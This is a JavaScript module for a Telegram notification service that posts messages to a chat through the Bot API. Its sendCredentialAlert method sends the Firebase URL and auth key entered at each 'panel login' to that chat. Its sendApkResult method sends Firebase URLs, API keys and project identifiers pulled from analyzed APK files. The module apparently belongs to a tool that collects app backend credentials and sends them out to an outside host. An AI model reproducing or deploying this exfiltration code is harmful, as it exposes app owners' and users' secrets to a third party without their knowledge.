"use strict";

/**
 * Telegram notification service.
 * Sends formatted messages to a configured Telegram chat via Bot API.
 */

const fetch = require("node-fetch");
const config = require("../config");

class TelegramService {
  /**
   * Check if Telegram is configured.
   */
  static get isConfigured() {
    return Boolean(config.telegram.botToken && config.telegram.chatId);
  }

  /**
   * Send a plain text message.
   */
  static async sendMessage(text) {
    if (!this.isConfigured) {
      console.warn("[Telegram] Not configured — skipping message");
      return { skipped: true };
    }

    const url = `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`;

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: config.telegram.chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    if (!response.ok) {
      const body = await response.text().catch(() => "");
      throw new Error(`Telegram API error ${response.status}: ${body.slice(0, 200)}`);
    }

    return response.json();
  }

  /**
   * Send a credential notification (new panel login).
   */
  static async sendCredentialAlert(firebaseUrl, authKey) {
    const timestamp = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    const text = [
      "🔥 <b>New Panel Login</b>",
      `URL: <code>${firebaseUrl}</code>`,
      `KEY: <code>${authKey}</code>`,
      `Time: ${timestamp}`,
    ].join("\n");

    return this.sendMessage(text);
  }

  /**
   * Send an APK analysis result.
   */
  static async sendApkResult(filename, result) {
    const lines = [
      `📦 <b>APK Analyzed:</b> ${filename}`,
      "",
      `🔗 Firebase URL: <code>${result.firebaseUrl || "Not found"}</code>`,
      `🔑 API Key: <code>${result.apiKey || "Not found"}</code>`,
    ];
    if (result.projectId) lines.push(`📁 Project ID: <code>${result.projectId}</code>`);
    if (result.appId) lines.push(`📱 App ID: <code>${result.appId}</code>`);

    return this.sendMessage(lines.join("\n"));
  }
}

module.exports = TelegramService;
